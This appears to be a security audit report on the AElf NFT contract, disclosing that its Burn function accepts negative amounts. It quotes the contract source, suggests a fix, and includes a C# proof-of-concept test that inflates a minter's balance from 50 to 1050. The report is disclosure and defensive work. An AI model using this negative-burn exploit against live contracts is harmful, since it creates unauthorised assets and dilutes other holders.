# Audit Report

## Title
Negative Amount Bypass in NFT Burn Function Allows Arbitrary Balance Inflation

## Summary
The NFT contract's `Burn` function lacks validation for negative input amounts, allowing minters to inflate their NFT balances, protocol supply, and token quantities arbitrarily. When a negative amount is passed, the `SafeMath.Sub()` operation results in addition instead of subtraction, enabling unlimited NFT creation beyond protocol constraints.

## Finding Description

The vulnerability exists in the `Burn` function where balance manipulation occurs without validating that the input amount is non-negative. [1](#0-0) 

The root cause stems from the input amount being defined as a signed `int64` type in the protocol buffer definition, [2](#0-1)  allowing negative values to be passed to the function.

While the `DoTransfer` helper function properly validates against negative amounts with an explicit check, [3](#0-2)  the `Burn` function performs direct state manipulation without calling `DoTransfer` or implementing equivalent validation.

When a negative amount is passed (e.g., `-1000`), the security check at line 91 passes because any positive balance is greater than a negative number (`50 >= -1000` evaluates to `true`). Subsequently, the `SafeMath.Sub()` operation with a negative operand mathematically results in addition. [4](#0-3) 

This behavior is confirmed by the SafeMath test suite, which explicitly tests that `10.Sub(-5)` equals `15`. [5](#0-4) 

In contrast, the MultiToken contract's `Burn` implementation properly validates amounts by calling `AssertValidToken`, which includes a check that `amount > 0`. [6](#0-5) [7](#0-6) 

## Impact Explanation

This vulnerability has **CRITICAL** severity with direct fund impact:

**Supply Invariant Violation:**
- Minters can inflate their NFT balance to arbitrary amounts (e.g., from 50 to 1,050 NFTs with a single call passing `-1000` as the amount)
- Protocol supply can exceed `total_supply` limits, breaking the fundamental NFT scarcity invariant that governs the entire protocol's economic model
- Token quantity becomes inconsistent with actual minted amounts

**Protocol-Wide Impact:**
- NFT protocol holders suffer immediate dilution of their holdings as new NFTs are created out of thin air
- NFT marketplace integrity is compromised as supply limits become meaningless
- The protocol's economic model breaks down entirely, as scarcity-based value is eliminated

**Severity Justification:**
This violates the critical "Token Supply & Fees" invariant requiring correct mint/burn limits and NFT uniqueness checks. It effectively allows unlimited asset creation, equivalent to unlimited money printing in a monetary system.

## Likelihood Explanation

The likelihood of exploitation is **HIGH** due to the following factors:

**Reachable Entry Point:**
The `Burn` function is a public RPC method defined in the NFT contract interface, [8](#0-7)  accessible to any caller meeting the preconditions.

**Feasible Preconditions:**
- Attacker must be in the minter list for the NFT protocol
- Minters are added by protocol creators and are not system-level trusted entities [9](#0-8) 
- This is a realistic scenario as legitimate minters exist for every NFT protocol and can be any address added by the creator

**Execution Practicality:**
- Single transaction attack with negative amount parameter
- No complex state setup or timing requirements needed
- Immediate and guaranteed success if attacker is a minter
- The permission check at line 90-93 passes because `balance >= negative_amount` evaluates to true

**Economic Rationality:**
Extremely rational for a malicious actor - effectively free NFT creation with zero cost and unlimited profit potential based on NFT market value.

## Recommendation

Add explicit validation for negative amounts in the `Burn` function, similar to the validation in `DoTransfer`:

```csharp
public override Empty Burn(BurnInput input)
{
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    // ... rest of the function
}
```

This aligns with the MultiToken contract's approach and prevents negative amount bypass.

## Proof of Concept

```csharp
[Fact]
public async Task NegativeBurnInflatesBalance_VulnerabilityTest()
{
    // Setup: Create NFT protocol and mint initial NFTs
    var symbol = await CreateTest();
    await AddMinterAsync(symbol);
    
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Quantity = 50,
        Uri = $"{BaseUri}test"
    });
    
    // Verify initial balance
    var initialBalance = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    initialBalance.ShouldBe(50);
    
    // EXPLOIT: Burn with negative amount to inflate balance
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount!
    });
    
    // Verify balance is now inflated
    var exploitedBalance = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    
    // Balance increased from 50 to 1050 instead of decreasing
    exploitedBalance.ShouldBe(1050);
    
    // Protocol supply also inflated beyond legitimate minting
    var protocolInfo = await NFTContractStub.GetNFTProtocolInfo.CallAsync(new StringValue { Value = symbol });
    protocolInfo.Supply.ShouldBe(1050);
}
```

## Notes

This vulnerability demonstrates a critical gap in input validation where the NFT contract fails to implement the same defensive checks present in other contract functions (`DoTransfer`) and related contracts (`MultiToken`). The mathematical behavior of `SafeMath.Sub()` with negative operands is correct (subtraction of a negative equals addition), but the lack of input validation allows this to be exploited for unauthorized balance inflation.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L335-353)
```csharp
    public override Empty AddMinters(AddMintersInput input)
    {
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
        var minterList = State.MinterListMap[protocolInfo.Symbol] ?? new MinterList();

        foreach (var minter in input.MinterList.Value)
            if (!minterList.Value.Contains(minter))
                minterList.Value.Add(minter);

        State.MinterListMap[input.Symbol] = minterList;

        Context.Fire(new MinterListAdded
        {
            Symbol = input.Symbol,
            MinterList = input.MinterList
        });
        return new Empty();
    }
```

**File:** protobuf/nft_contract.proto (L45-47)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** test/AElf.Sdk.CSharp.Tests/SafeMathTests.cs (L23-24)
```csharp
        10.Sub(5).ShouldBe(5);
        10.Sub(-5).ShouldBe(15);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L318-337)
```csharp
    public override Empty Burn(BurnInput input)
    {
        return Burn(Context.Sender, input.Symbol, input.Amount);
    }

    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```
